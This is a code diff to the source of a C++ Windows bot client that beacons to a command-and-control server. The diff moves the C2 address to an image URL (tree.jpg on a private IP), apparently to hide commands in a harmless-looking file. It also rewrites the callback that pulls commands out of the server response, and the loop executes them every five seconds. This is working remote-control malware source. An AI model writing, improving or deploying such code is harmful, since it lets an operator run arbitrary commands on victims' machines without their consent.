@@ -22,7 +22,9 @@ int main()
 
 	if (curlHandle) {
 		//Set C2 URL
-		curl_easy_setopt(curlHandle, CURLOPT_URL, "http://10.0.0.20/c2.html");
+		curl_easy_setopt(curlHandle, CURLOPT_URL, "http://10.0.0.34:8080/images/tree.jpg");
+		//Set buffer length
+		curl_easy_setopt(curlHandle, CURLOPT_BUFFERSIZE, 4096L);
 		//Set callback function
 		curl_easy_setopt(curlHandle, CURLOPT_WRITEFUNCTION, getCommands);
 		//Set callback Argument
@@ -37,12 +39,11 @@ int main()
 				Sleep(5000);
 				continue;
 			}
-			else {
-				//Execute commangs grabbed
-				executeCommands(&commandList,curlHandle);
-				//Sleep for 5 seconds before checking C2 server again
-				Sleep(5000);
-			}
+			//Execute commangs grabbed
+			executeCommands(&commandList,curlHandle);
+			//Sleep for 5 seconds before checking C2 server again
+			Sleep(5000);
+			
 
 		}
 
@@ -61,18 +62,20 @@ size_t getCommands(char *buff, size_t t, size_t nmemb, void* userData) {
 	//smatch variable to store commands identified in
 	std::smatch match;
 	//convert buff to string for analysis
-	std::string value = buff;
 	//Message from server (Will contain Command and unique bot ID)
+	std::string value(buff,nmemb);
 	std::string message;
 	//Store message attributes in list
 	std::vector<std::string>* list = (std::vector<std::string> *)userData;
 	//Search for command parameter
+	int position;
+	std::string test;
 	if (std::regex_search(value, match, pattern)) {
-		message = match[1];
+		std::string command;
+		position = match.position();
+		command = value.substr(position + 4, value.length() - 6 - position);
+		list->push_back(command);
 	}
-	
-	std::string command = message.substr(message.find(":")+ 1, message.length());
-	list->push_back(command);
 	//system(command.c_str());
 	return nmemb;
 }
